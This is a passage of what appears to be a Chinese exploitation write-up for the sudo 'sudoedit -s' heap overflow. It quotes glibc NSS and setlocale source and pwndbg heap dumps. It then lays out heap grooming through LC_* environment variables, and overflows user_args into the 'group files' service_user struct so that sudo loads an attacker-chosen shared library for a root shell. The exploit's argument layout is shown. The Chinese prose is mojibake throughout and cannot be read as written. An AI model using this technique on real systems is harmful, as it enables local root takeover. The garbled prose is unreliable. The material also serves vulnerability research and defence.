åœ¨`sudo.c:191`ä¼šè°ƒç”¨`get_user_info`å‡½æ•°åœ¨è·å–ç”¨æˆ·ä¿¡æ¯çš„æ—¶å€™éœ€è¦è·å–ç”¨æˆ·çš„ç”¨æˆ·åå’Œå£ä»¤ä¿¡æ¯ï¼Œè¿™å°±éœ€è¦åˆ°äº†`nss`æœåŠ¡ï¼Œä¹Ÿå°±æ˜¯éœ€è¦è°ƒç”¨`passwd`å¯¹åº”çš„æœåŠ¡è§„èŒƒã€‚åœ¨å‡½æ•°ä¸­ä¼šè°ƒç”¨æ ¹æ®é…ç½®æ–‡ä»¶åˆå§‹åŒ–`file/systemd`ç­‰æœåŠ¡è§„èŒƒï¼Œè°ƒç”¨æ ˆå¦‚ä¸‹

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t017c2687cdf250009f.png)

å…¶ä¸­å…³é”®çš„é€»è¾‘ä»£ç å¦‚ä¸‹

```
int
__nss_database_lookup2 (const char *database, const char *alternate_name,
            const char *defconfig, service_user **ni)
`{`
  //...
  if (service_table == NULL)
    /* Read config file.  */
    service_table = nss_parse_file (_PATH_NSSWITCH_CONF);
  //...
`}`
static name_database *
nss_parse_file (const char *fname)
`{`
  //...
  fp = fopen (fname, "rce");
  if (fp == NULL)
    return NULL;
  //...
  result = (name_database *) malloc (sizeof (name_database));
  if (result == NULL)
    `{`
      fclose (fp);
      return NULL;
    `}`

  result-&gt;entry = NULL;
  result-&gt;library = NULL;
  do
  `{`
    name_database_entry *this;
    ssize_t n;

    n = __getline (&amp;line, &amp;len, fp);
    if (n &lt; 0)
      break;
    if (line[n - 1] == '\n')
      line[n - 1] = '\0';

    /* Because the file format does not know any form of quoting we
     can search forward for the next '#' character and if found
     make it terminating the line.  */
    *__strchrnul (line, '#') = '\0';

    /* If the line is blank it is ignored.  */
    if (line[0] == '\0')
      continue;

    /* Each line completely specifies the actions for a database.  */
    this = nss_getline (line);// å¤„ç†é…ç½®æ–‡ä»¶ä¸­çš„æ¯ä¸€è¡Œ
    if (this != NULL)
    `{`
      if (last != NULL)
        last-&gt;next = this;
      else
        result-&gt;entry = this;

      last = this;
    `}`
  `}`
  while (!__feof_unlocked (fp));
  //...
`}`
static name_database_entry *
nss_getline (char *line)
`{`
  //...
  result-&gt;service = nss_parse_service_list (line);// å¤„ç†æ–‡ä»¶ä¸­è¯¥è¡Œçš„æ‰€æœ‰æœåŠ¡è§„èŒƒ
  //...
`}`
static service_user *
nss_parse_service_list (const char *line)// å¤„ç†æ¯ä¸€ä¸ªæœåŠ¡è§„èŒƒ
`{`
  while (1)
  `{`
    new_service = (service_user *) malloc (sizeof (service_user)
                                           + (line - name + 1));
    // èµ‹å€¼
    *nextp = new_service;
    nextp = &amp;new_service-&gt;next;
    continue;
  `}`
`}`
```

å½“é…ç½®æ–‡ä»¶ä¸­æ‰€æœ‰çš„æœåŠ¡è§„èŒƒå…¨éƒ¨å¤„ç†å®Œæ¯•ä¹‹åï¼Œå½¢æˆäº†ä¸‹é¢çš„åˆ—è¡¨ï¼Œå…¶ä¸­é“¾è¡¨å¤´å­˜å‚¨åœ¨`libc`ä¸­ã€‚

```
pwndbg&gt; p &amp;service_table
$52 = (name_database **) 0x7ffff7f457a8 &lt;service_table&gt;
pwndbg&gt; p *service_table
$53 = `{`
  entry = 0x5555555829d0,
  library = 0x0
`}`
pwndbg&gt; p *service_table-&gt;entry
$54 = `{`
  next = 0x555555582a70,
  service = 0x5555555829f0,
  name = 0x5555555829e0 "passwd"
`}`
pwndbg&gt; p *service_table-&gt;entry-&gt;next
$55 = `{`
  next = 0x5555555885b0,
  service = 0x555555588530,
  name = 0x555555582a80 "group"
`}`
pwndbg&gt; p *service_table-&gt;entry-&gt;next-&gt;service
$56 = `{`
  next = 0x555555588570,
  actions = `{`NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_RETURN, NSS_ACTION_RETURN`}`,
  library = 0x0,
  known = 0x0,
  name = 0x555555588560 "files"
`}`
```

ç»è¿‡è°ƒè¯•å‘ç°`get_user_info`å‡½æ•°ä¸­çš„å †å—ç”³è¯·é¡ºåºå¦‚ä¸‹

```
malloc(0x100)
malloc(0x400)
malloc(0x1d8)// tcache
malloc(0x10)
malloc(0x78)// å›ºå®š0x80 // é‡Šæ”¾
malloc(0x1000) 
malloc(0x17)// ä»¥ä¸‹å‡ä¸ºå›ºå®šç”³è¯·ï¼Œä¸”ä¸ä¼šé‡Šæ”¾
malloc(0x36) 
malloc(0x38)
malloc(0x16)
malloc(0x36)// group files
```

åœ¨`glibc&gt;2.27`ç‰ˆæœ¬ä¹‹ä¸Šç”±äºå­˜åœ¨`tcache`ï¼Œå› æ­¤åœ¨ç”³è¯·å †å—çš„æ—¶å€™ä¼šé¦–å…ˆåˆ¤æ–­`tcache`ä¸­æ˜¯å¦å­˜åœ¨ç©ºé—²çš„å †å—ã€‚æˆ‘ä»¬çš„ç›®çš„æ˜¯è¦†å†™`group files`å †å—ï¼Œæ”»å‡»å¦‚ä¸‹é¦–å…ˆæ˜¯è·å–äº†`free`çš„åŸè¯­ï¼Œå¾—åˆ°å¯ä»¥é‡Šæ”¾ä»»æ„å¤§å°å’Œæ•°é‡çš„å †å—ä¹‹åè¿›è¡Œäº†ä¸‹é¢çš„å¸ƒç½®ã€‚é¦–å…ˆæ˜¯`2`ä¸ª`0x40`å¤§å°çš„å †å—ç”¨æ¥æ»¡è¶³`passwd`çš„`service_user`çš„å †å—çš„ç”³è¯·ï¼Œç„¶åé‡Šæ”¾ä¸€ä¸ªå †å—ï¼Œç”¨æ¥æ»¡è¶³`user_args`å †å—çš„ç”³è¯·ï¼Œç„¶åå†é‡Šæ”¾ä¸€ä¸ª`0x40`å¤§å°çš„å †å—ç”¨æ¥æ»¡è¶³`group files service_user`çš„å †å—çš„ç”³è¯·ã€‚

é‚£ä¹ˆåœ¨`get_user_info`å‡½æ•°åˆå§‹åŒ–æ‰€æœ‰çš„`service_user`å †å—ä¹‹åï¼Œåœ¨ä¹‹åæº¢å‡º`user_args`çš„æ—¶å€™å°±å¯ä»¥ç›´æ¥æº¢å‡ºåˆ°`group files`çš„`service_user`ç»“æ„ä½“ï¼Œå°±å¯ä»¥è¿›è¡ŒåŠ è½½æˆ‘ä»¬è‡ªå·±çš„åŠ¨æ€é“¾æ¥åº“`getshell`ã€‚

### <a class="reference-link" name="free%20%E5%8E%9F%E8%AF%AD"></a>free åŸè¯­

`sudo`åœ¨`main`å‡½æ•°çš„èµ·å§‹ä½ç½®`sudo.c:154`è°ƒç”¨äº†`setlocale(LC_ALL, "");`å‡½æ•°ï¼Œå…¶ä¸­`locale=""`è¡¨ç¤ºæ ¹æ®ç¯å¢ƒå˜é‡æ¥è®¾ç½®`locale`ã€‚`setlocale`ä¼šç”³è¯·å’Œé‡Šæ”¾å¤§é‡çš„å †å—ã€‚æ¥çœ‹ä¸€ä¸‹`setlocale`å‡½æ•°çš„æºç 

```
//setlocale(LC_ALL, "");
//glibc/locale/setlocale.c
char *
setlocale (int category, const char *locale)
`{`
  char *locale_path;
  size_t locale_path_len;
  const char *locpath_var;
  char *composite;

  //...

  if (category == LC_ALL)
  `{`
   //...

    /* Load the new data for each category.  */
    while (category-- &gt; 0)
      if (category != LC_ALL)
      `{`
        // å¾ªç¯æŸ¥æ‰¾ç¯å¢ƒå˜é‡ä¸­çš„LC*ç¯å¢ƒå˜é‡çš„å€¼ï¼Œå¹¶æ ¹æ®ä¼˜å…ˆçº§é¡ºåºè¿›è¡ŒåŠ è½½ï¼Œç¯å¢ƒå˜é‡çš„å€¼ä¼šå­˜å‚¨åœ¨newnamesä¸­
        newdata[category] = _nl_find_locale (locale_path, locale_path_len,
                                             category,
                                             &amp;newnames[category]);

        //...
      `}`
    /* Create new composite name.  */
    composite = (category &gt;= 0
                 ? NULL : new_composite_name (LC_ALL, newnames));
    if (composite != NULL)
    `{`
      //setname&amp;setdataï¼Œå³ä¸º_nl_global_locale.__namesæ•°ç»„èµ‹å€¼ï¼Œè¯¥æ•°ç»„ä¸­å­˜å‚¨æœ‰æ‰€æœ‰çš„ç¯å¢ƒå˜é‡çš„å€¼
      // å¦‚æœæ•°ç»„ä¸­åŸæ¥å­˜å‚¨æœ‰å€¼ï¼Œä¸”ä¸æ˜¯é»˜è®¤çš„"C"ï¼Œé‚£ä¹ˆä¼šé‡Šæ”¾åŸæœ‰çš„å †å—
    `}`
    else
      for (++category; category &lt; __LC_LAST; ++category)
        if (category != LC_ALL &amp;&amp; newnames[category] != _nl_C_name
            &amp;&amp; newnames[category] != _nl_global_locale.__names[category])
          free ((char *) newnames[category]);// é‡Šæ”¾æ‰€æœ‰çš„newnameså³ç¯å¢ƒå˜é‡çš„å€¼
    //...

    return composite;
  `}`
  else
  `{`
    //...
  `}`
`}`
libc_hidden_def (setlocale)
```

```
struct __locale_data *
  _nl_find_locale (const char *locale_path, size_t locale_path_len,
                   int category, const char **name)
`{`

  if (cloc_name[0] == '\0')// è¿™é‡Œè·å–æ ˆä¸­çš„LC_ALLå˜é‡çš„å€¼
  `{`
    /* The user decides which locale to use by setting environment
     variables.  */
    cloc_name = getenv ("LC_ALL");// æŒ‰ç…§ç¯å¢ƒå˜é‡ç”Ÿæ•ˆçš„é¡ºåºè¿›è¡Œget
    if (!name_present (cloc_name))
      cloc_name = getenv (_nl_category_names_get (category));
    if (!name_present (cloc_name))
      cloc_name = getenv ("LANG");
    if (!name_present (cloc_name))
      cloc_name = _nl_C_name;
  `}`

  else if (!valid_locale_name (cloc_name))// è¿™é‡Œå˜é‡çš„å€¼æœ€å¤§ä¸º255å³0xff
  `{`
    __set_errno (EINVAL);
    return NULL;
  `}`

  *name = cloc_name;

  /* We really have to load some data.  First we try the archive,
     but only if there was no LOCPATH environment variable specified.  */
  if (__glibc_likely (locale_path == NULL))
  `{`
    struct __locale_data *data
      = _nl_load_locale_from_archive (category, name);
    if (__glibc_likely (data != NULL))
      return data;

    /* Nothing in the archive with the given name.  Expanding it as
     an alias and retry.  */
    cloc_name = _nl_expand_alias (*name);
    if (cloc_name != NULL)
    `{`
      data = _nl_load_locale_from_archive (category, &amp;cloc_name);
      if (__builtin_expect (data != NULL, 1))
        return data;
    `}`

    /* Nothing in the archive.  Set the default path to search below.  */
    locale_path = _nl_default_locale_path;
    locale_path_len = sizeof _nl_default_locale_path;
  `}`
  else
    /* We really have to load some data.  First see whether the name is
       an alias.  Please note that this makes it impossible to have "C"
       or "POSIX" as aliases.  */
    cloc_name = _nl_expand_alias (*name);

  if (cloc_name == NULL)
    /* It is no alias.  */
    cloc_name = *name;

  /* Make a writable copy of the locale name.  */
  char *loc_name = strdupa (cloc_name);

    // language[_territory[.codeset]][@modifier]
  // ä¸‹é¢å°†æŒ‰ç…§ğŸ‘†çš„æ ¼å¼ä¸€ä¾æ¬¡è¿›è¡Œè§£æï¼Œnormalized_codesetæ˜¯å°å†™çš„codeset
  mask = _nl_explode_name (loc_name, &amp;language, &amp;modifier, &amp;territory,
                           &amp;codeset, &amp;normalized_codeset);
  if (mask == -1)
    /* Memory allocate problem.  */
    return NULL;

  /* If exactly this locale was already asked for we have an entry with
     the complete name.  */
  // 
  /*
    abs_filename = (char *) malloc (dirlist_len
                  + strlen (language)
                  + ((mask &amp; XPG_TERRITORY) != 0
                     ? strlen (territory) + 1 : 0)
                  + ((mask &amp; XPG_CODESET) != 0
                     ? strlen (codeset) + 1 : 0)
                  + ((mask &amp; XPG_NORM_CODESET) != 0
                     ? strlen (normalized_codeset) + 1 : 0)
                  + ((mask &amp; XPG_MODIFIER) != 0
                     ? strlen (modifier) + 1 : 0)
                  + 1 + strlen (filename) + 1);
    */
  // ğŸ‘‡è¿™ä¸ªå‡½æ•°æœ€ä¸ºé‡è¦çš„æ˜¯æŒ‰ç…§ ğŸ‘†çš„è®¡ç®—å…¬å¼è¿›è¡Œå †å—çš„åˆ†é…å’Œé‡Šæ”¾
  locale_file = _nl_make_l10nflist (&amp;_nl_locale_file_list[category],
                                    locale_path, locale_path_len, mask,
                                    language, territory, codeset,
                                    normalized_codeset, modifier,
                                    _nl_category_names_get (category), 0);

  if (locale_file == NULL)
  `{`
    /* Find status record for addressed locale file.  We have to search
     through all directories in the locale path.  */
    locale_file = _nl_make_l10nflist (&amp;_nl_locale_file_list[category],
                                      locale_path, locale_path_len, mask,
                                      language, territory, codeset,
                                      normalized_codeset, modifier,
                                      _nl_category_names_get (category), 1);
    if (locale_file == NULL)
      /* This means we are out of core.  */
      return NULL;
  `}`
  //...

`}`
```

```
//intl/l10nflist.c
struct loaded_l10nfile *
  _nl_make_l10nflist (struct loaded_l10nfile **l10nfile_list,
                      const char *dirlist, size_t dirlist_len,
                      int mask, const char *language, const char *territory,
                      const char *codeset, const char *normalized_codeset,
                      const char *modifier,
                      const char *filename, int do_allocate)
`{`
  char *abs_filename;
  struct loaded_l10nfile *last = NULL;
  struct loaded_l10nfile *retval;
  char *cp;
  size_t entries;
  int cnt;

  /* Allocate room for the full file name.  */
  // è¿™é‡ŒæŒ‰ç…§ç¯å¢ƒå˜é‡è¿›è¡Œäº†å †å—çš„åˆ†é…ï¼Œæ³¨æ„åˆ°è¿™é‡Œä¼ å…¥çš„å‚æ•°do_allocate=0
  // dirlist_lenä¸º0x10
  abs_filename = (char *) malloc (dirlist_len
                                  + strlen (language)
                                  + ((mask &amp; XPG_TERRITORY) != 0
                                     ? strlen (territory) + 1 : 0)
                                  + ((mask &amp; XPG_CODESET) != 0
                                     ? strlen (codeset) + 1 : 0)
                                  + ((mask &amp; XPG_NORM_CODESET) != 0
                                     ? strlen (normalized_codeset) + 1 : 0)
                                  + ((mask &amp; XPG_MODIFIER) != 0
                                     ? strlen (modifier) + 1 : 0)
                                  + 1 + strlen (filename) + 1);

  if (abs_filename == NULL)
    return NULL;

  // è¿™é‡Œä¼šæ ¹æ®maskçš„å€¼è¿›è¡Œè·¯å¾„çš„æ‹·è´

  /* Look in list of already loaded domains whether it is already
     available.  */
  last = NULL;
  for (retval = *l10nfile_list; retval != NULL; retval = retval-&gt;next)
    if (retval-&gt;filename != NULL)
    `{`
      int compare = strcmp (retval-&gt;filename, abs_filename);
      if (compare == 0)
        /* We found it!  */
        break;
      if (compare &lt; 0)
      `{`
        /* It's not in the list.  */
        retval = NULL;
        break;
      `}`

      last = retval;
    `}`
// å¦‚æœæ–‡ä»¶åœ¨l10nfile_liståˆ—è¡¨ä¸­ï¼Œå³ä¹‹å‰å·²ç»æŸ¥çœ‹è¿‡äº†ï¼Œé‚£ä¹ˆè¿™é‡Œå°±ç›´æ¥é‡Šæ”¾abs_filenameå³ä¹‹å‰ç”³è¯·çš„å †å—ã€‚
  if (retval != NULL || do_allocate == 0)
  `{`
    free (abs_filename);// è¿™é‡Œä¼šé‡Šæ”¾å¼€å¤´ç”³è¯·çš„å †å—
    return retval;
  `}`
//...
  // è¿™é‡Œé€šè¿‡æ”¹å˜maskï¼ˆç»„åˆterritory,codesetç­‰é€šè¿‡maskæ§åˆ¶çš„å‚æ•°ï¼‰ï¼Œç©·ä¸¾è·¯å¾„æœç´¢é…ç½®æ–‡ä»¶
  cnt = __argz_count (dirlist, dirlist_len) == 1 ? mask - 1 : mask;
  for (; cnt &gt;= 0; --cnt)
    if ((cnt &amp; ~mask) == 0)
    `{`
      /* Iterate over all elements of the DIRLIST.  */
      char *dir = NULL;

      while ((dir = __argz_next ((char *) dirlist, dirlist_len, dir))
             != NULL)
        retval-&gt;successor[entries++]
        = _nl_make_l10nflist (l10nfile_list, dir, strlen (dir) + 1, cnt,
                              language, territory, codeset,
                              normalized_codeset, modifier, filename, 1);
    `}`
  //...

  return retval;
`}`
```

ä»ä¸Šé¢çš„æºç æ¥çœ‹`setlocale`å‡½æ•°ï¼Œå¦‚æœä¼ å…¥çš„å‚æ•°æ˜¯`NULL`ï¼Œé‚£ä¹ˆå°±ä¼šè¿”å›`_nl_global_locale.__names`æ•°ç»„ä¸­å¯¹åº”çš„å€¼å³ç›¸åº”çš„`LC_*`çš„å€¼ã€‚å¦‚æœä¼ å…¥çš„å‚æ•°æ˜¯`â€œâ€`ï¼Œé‚£ä¹ˆå°±ä¼šæ ¹æ®ç¯å¢ƒå˜é‡è®¾ç½®`_nl_global_locale.__names`ä¸­çš„å€¼ï¼Œå‡½æ•°æœ€ä¸»è¦çš„æ˜¯è¿›å…¥äº†ä¸€ä¸ª`while`å¾ªç¯ï¼Œæ¯æ¬¡è°ƒç”¨`_nl_find_locale`å‡½æ•°é¦–å…ˆä»ç¯å¢ƒå˜é‡ä¸­æŒ‰ç…§ä¼˜å…ˆçº§é¡ºåºåŠ è½½ç›¸åº”çš„ç¯å¢ƒå˜é‡ï¼Œç„¶åæ ¹æ®ç¯å¢ƒå˜é‡ä»`/usr/lib/locale`ä¸­æŸ¥æ‰¾æœ‰æ²¡æœ‰å¯¹åº”çš„æ–‡ä»¶ï¼Œè¿™é‡Œä¼šæ ¹æ®`mask`çš„å€¼æ§åˆ¶åŠ è½½çš„ä¼˜å…ˆçº§ï¼ŒåŠ è½½æ–‡ä»¶ï¼Œå¦‚æœæ²¡æœ‰å¯¹åº”çš„æ–‡ä»¶å°±ä¼šè¿”å›`NULL`ã€‚

> è¿™é‡Œæ¯”å¦‚LC_COLLATE=C.UTF-8[@aaaa](https://github.com/aaaa)ï¼Œå¦‚æœ/usr/lib/locale/C.UTF-8[@aaaa](https://github.com/aaaa)/LC_COLLATEæ–‡ä»¶å­˜åœ¨çš„è¯ï¼Œé‚£ä¹ˆå°±åŠ è½½è¿™ä¸ªæ–‡ä»¶ï¼Œå¦åˆ™å°±åŠ è½½/usr/lib/locale/C.UTF-8/LC_COLLATEæ–‡ä»¶ï¼Œå½“ç„¶è¿™é‡Œæœ‰å¾ˆå¤šçš„è·¯å¾„é€‰æ‹©ï¼Œä¸æ­¢è¿™ä¸¤ä¸ªã€‚

å½“`_nl_find_locale`å‡½æ•°è¿”å›çš„ä¸º`NULL`çš„æ—¶å€™ï¼Œ`while`å¾ªç¯å°±ä¼šç»ˆæ­¢ï¼Œæ­¤æ—¶`category&gt;0`ï¼Œé‚£ä¹ˆè¿™é‡Œå°±è¡¨æ˜åŠ è½½ç¯å¢ƒå˜é‡å‡ºç°äº†é”™è¯¯ï¼Œä¼šé‡Šæ”¾ä¹‹å‰ç”³è¯·çš„æ‰€æœ‰çš„`newnames`ï¼Œä¹Ÿå°±æ˜¯ç¯å¢ƒå˜é‡ä¸­çš„å€¼æ¯”å¦‚`C.UTF-8[@aaaa](https://github.com/aaaa)`ã€‚

å¦åˆ™å½“`while`å¾ªç¯æ‰§è¡Œå®Œæ¯•ä¹‹åå°±ä¼šå°†æ‰€æœ‰çš„`_nl_global_locale.__names`æ•°ç»„ä¸­å¯¹åº”çš„å€¼è®¾ç½®ä¸ºæˆ‘ä»¬è¾“å…¥çš„å€¼ï¼Œç„¶åå°†`LC_ALL`èµ‹å€¼

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01bd575542cfec75ef.png)

é‚£ä¹ˆè¿™é‡Œçš„`free`åŸè¯­å°±å‡ºæ¥äº†ï¼Œå‡å¦‚æˆ‘ä»¬æƒ³è¦è®¾ç½®`n`ä¸ª`size`å¤§å°çš„å †å—ï¼Œé‚£ä¹ˆå°±è®¾ç½®`n`ä¸ªç¯å¢ƒå˜é‡ï¼ˆè¿™é‡Œæ³¨æ„é¡ºåºï¼Œç¯å¢ƒå˜é‡ä»åå‘å‰å¼€å§‹åŠ è½½ï¼‰ï¼Œç¯å¢ƒå˜é‡çš„å€¼ä¸º`C.UTF-8[@len](https://github.com/len)`ï¼Œå…¶ä¸­`len`çš„å¤§å°æ»¡è¶³`&gt; size-0x20 &amp; &lt; size-0x10`ã€‚

è¿™é‡Œéœ€è¦æ³¨æ„çš„ä¸€ä¸ªé—®é¢˜å°±æ˜¯ï¼Œåœ¨è¿›è¡Œç¯å¢ƒå˜é‡åŠ è½½çš„è¿‡ç¨‹ä¸­ä¼šå¯¹äºæ¯ä¸€ä¸ªä¸åŒ`size`çš„å †å—ï¼Œéƒ½ä¼šé‡Šæ”¾ä¸€ä¸ª`size+0x10`å¤§å°çš„å †å—ï¼Œè¿™æ˜¯è·¯å¾„æ‹¼æ¥é€ æˆçš„ã€‚ä½†æ˜¯ç›¸åŒ`size`å¤§å°çš„ä¼šå¤ç”¨åŒä¸€ä¸ªå †å—ï¼Œå› æ­¤åœ¨`tcache`ä¸­ä¸åŒ`size`å¤§å°çš„å †å—åªä¼šé¢å¤–äº§ç”Ÿ`1`ä¸ª`size+0x10`å¤§å°çš„å †å—ã€‚éœ€è¦æ³¨æ„çš„æ˜¯å¯¹äº`size`æ¯”è¾ƒå°çš„å †å—ï¼Œç”±äº`getlocale`ä¸­å †å—çš„ç”³è¯·æ¯”è¾ƒå¤šï¼Œå› æ­¤å¯èƒ½ä¼šè¢«ç”³è¯·å›å»ï¼Œç›®å‰å¯ä»¥è‚¯å®šçš„æ˜¯å¯¹äº`0x80`æˆ–è€…å¤§äº`0x80`çš„é™„åŠ å †å—ä¼šä¿å­˜åœ¨`tcache`ä¸­ã€‚

```
pwndbg&gt; heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x555555582580 (size : 0x1da80)
       last_remainder: 0x5555555814b0 (size : 0xf90)
            unsortbin: 0x5555555814b0 (size : 0xf90)
(0x20)   tcache_entry[0](1): 0x5555555814a0
(0x40)   tcache_entry[2](3): 0x55555557ff40 --&gt; 0x555555580620 --&gt; 0x555555581380// group files
(0x70)   tcache_entry[5](1): 0x555555580cb0 // ç¯å¢ƒå˜é‡é‡Šæ”¾äº§ç”Ÿçš„0x70å †å—
(0x80)   tcache_entry[6](1): 0x555555580a90 // user_argså †å—ï¼Œæ˜¯é™„åŠ å †å—
(0x1e0)   tcache_entry[28](1): 0x55555557f2a0
(0x410)   tcache_entry[63](1): 0x55555557f500
```

è¿™é‡Œç”±äº`ubuntu 20.04`ä¸‹é¢æˆ‘åœ¨è°ƒè¯•çš„æ—¶å€™`execve`æ‰§è¡Œä¹‹å`sudo main`å‡½æ•°æ‰§è¡Œä¹‹å‰å°±ä¼šæœ‰ä¸€ä¸ª`0x80`çš„å †å—ï¼Œä¸çŸ¥é“ä»€ä¹ˆåŸå› ï¼Œå› æ­¤è¿™é‡Œç›´æ¥é‡Šæ”¾`0x80`çš„å †å—ä¼šæœ‰é—®é¢˜ï¼Œå› æ­¤è¿™é‡Œæˆ‘æ˜¯ç”¨é™„åŠ å †å—æ¥å®ç°`0x80`å¤§å°çš„å †å—çš„æ•ˆæœã€‚

æ‹¿åˆ°ä¸Šè¿°çš„å †å¸ƒå±€ä¹‹åå°±å¯ä»¥å°†`user_args`é•¿åº¦è®¾ç½®ä¸º`0x80`ï¼Œç”³è¯·å¾—åˆ°`0x555555580a90`å †å—ï¼Œä¹‹åå°±å¯ä»¥è¦†å†™`0x555555581380`çš„`group files service_user`ç»“æ„ä½“äº†ã€‚

è¿™é‡Œæˆ‘ä»¬çœ‹åˆ°å †å—ä¹‹é—´çš„å·®å€¼æ˜¯`0x8f0`ï¼Œæˆ‘ä»¬éœ€è¦è¦†å†™è¿™äº›é•¿åº¦ã€‚ä¸­é—´è¿™äº›å †å—éƒ½æ˜¯åœ¨è¿›è¡Œ`setlocale`ä¸­äº§ç”Ÿçš„ï¼Œå¯¹ä¹‹åçš„ç¨‹åºè¿›è¡Œæ²¡æœ‰å½±å“ï¼Œå¯ä»¥ç›´æ¥è¦†å†™ã€‚æ ¹æ®ä¹‹å‰æº¢å‡ºçš„è§„åˆ™ï¼Œé‡åˆ°`\\`å°±ä¼šç»§ç»­å‘åè¯»ã€‚ç›®å‰`exp`ä¸­å‚æ•°è®¾ç½®å¦‚ä¸‹

```
"sudoedit", "-s", smash_a, "\\", smash_b, NULL, envp
```

å‚æ•°å’Œç¯å¢ƒå˜é‡åœ¨å†…å­˜ä¸­çš„è¡¨ç°æ–¹å¼å¦‚ä¸‹

```
// argv-&gt;0x7ffc304d1a18
pwndbg&gt; telescope 0x7ffc304d1a18
00:0000â”‚ rdx  0x7ffc304d1a18 â€”â–¸ 0x7ffc304d1df6 â—‚â€” 'sudoedit'
01:0008â”‚      0x7ffc304d1a20 â€”â–¸ 0x7ffc304d1dff â—‚â€” 0x414141414100732d /* '-s' */
02:0010â”‚      0x7ffc304d1a28 â€”â–¸ 0x7ffc304d1e02 â—‚â€” 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\'
03:0018â”‚      0x7ffc304d1a30 â€”â–¸ 0x7ffc304d1e3c â—‚â€” 0x424242424242005c /* '\\' */
04:0020â”‚      0x7ffc304d1a38 â€”â–¸ 0x7ffc304d1e3e â—‚â€” 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\\'
05:0028â”‚      0x7ffc304d1a40 â—‚â€” 0x0
06:0030â”‚      0x7ffc304d1a48 â€”â–¸ 0x7ffc304d1e76 â—‚â€” 0x5c005c005c005c /* '\\' */
07:0038â”‚      0x7ffc304d1a50 â€”â–¸ 0x7ffc304d1e78 â—‚â€” 0x5c005c005c005c /* '\\' */
//...
pwndbg&gt;
40:0200â”‚   0x7ffc304d1c18 â€”â–¸ 0x7ffc304d1eea â—‚â€” 0x5c005c005c005c /* '\\' */
41:0208â”‚   0x7ffc304d1c20 â€”â–¸ 0x7ffc304d1eec â—‚â€” 0x5c005c005c005c /* '\\' */
42:0210â”‚   0x7ffc304d1c28 â€”â–¸ 0x7ffc304d1eee â—‚â€” 0x2f58005c005c005c /* '\\' */
43:0218â”‚   0x7ffc304d1c30 â€”â–¸ 0x7ffc304d1ef0 â—‚â€” 0x30502f58005c005c /* '\\' */
44:0220â”‚   0x7ffc304d1c38 â€”â–¸ 0x7ffc304d1ef2 â—‚â€” 0x5f5030502f58005c /* '\\' */
45:0228â”‚   0x7ffc304d1c40 â€”â–¸ 0x7ffc304d1ef4 â—‚â€” 'X/P0P_SH3LLZ_'
46:0230â”‚   0x7ffc304d1c48 â€”â–¸ 0x7ffc304d1f02 â—‚â€” 0x433d4c4c415f434c ('LC_ALL=C')
47:0238â”‚   0x7ffc304d1c50 â—‚â€” 0x0
```

éœ€è¦æ³¨æ„çš„æ˜¯æ ˆä¸­æ¯ä¸€ä¸ªå‚æ•°çš„ç»“å°¾ä¾é çš„æ˜¯`\\`ã€‚é¦–å…ˆç¬¬ä¸€æ¬¡å¤åˆ¶ï¼Œé‡åˆ°`\\`ä¼šå°†`\\, smash_b, envp`æ‹·è´ä¸€éï¼Œç„¶åæ˜¯ç¬¬äºŒæ¬¡å¤åˆ¶ï¼Œå‚æ•°å³ä¸º`\\`å› æ­¤ä¼šå°†`smash_b,envp`æ‹·è´ä¸€éï¼Œæ¥ç€æ˜¯`smash_b`ï¼Œç”±äº`smash_b`ä¹‹åä¹Ÿæ˜¯`\\`ï¼Œå› æ­¤ä¼šä¸€ç›´ç»§ç»­æ‹·è´ï¼Œä¹Ÿå°±æ˜¯å°†`envp`æ‹·è´äº†ä¸€éã€‚å€Ÿç€å°±ç»“æŸæ‹·è´äº†ã€‚ä¹Ÿå°±æ˜¯è¯´`smash_b,envp`éƒ½è¢«æ‹·è´äº†ä¸‰éï¼Œ`smash_a`è¢«æ‹·è´äº†ä¸€éã€‚æ³¨æ„åˆ°æ¯ä¸€æ¬¡æ‹·è´ç»“æŸéƒ½ä¼šåœ¨ç»“å°¾å¤„åŠ `space`å³ç©ºæ ¼ï¼ˆæœ€åä¸€ä¸ªç©ºæ ¼ä¼šè¢«è¦†å†™ä¸º`0`ï¼‰ã€‚åœ¨è®¾å®š`smash_a,smash_b,envp`çš„é•¿åº¦çš„æ—¶å€™åŸºæœ¬å°±æ˜¯`user_args/2`å³ä¸º`smash_a,smash_b`çš„å€¼ï¼Œå‰©ä½™çš„å€¼`/3`å°±æ˜¯`envp`çš„é•¿åº¦ï¼Œä¸å¤Ÿçš„è¯å†ç”¨`smash_a`çš„é•¿åº¦è¿›è¡Œå¾®è°ƒã€‚

å½“æˆ‘ä»¬è¦†å†™å®Œæ¯•`group service_user`ç»“æ„ä½“çš„`name`å­—æ®µä¹‹åï¼Œ`sudo`ä¼šç»è¿‡ä¸€ç³»åˆ—çš„è°ƒç”¨ç›´åˆ°`nss_load_library`æœ€ç»ˆæ‰“å¼€`getshell`çš„åŠ¨æ€é“¾æ¥åº“ã€‚

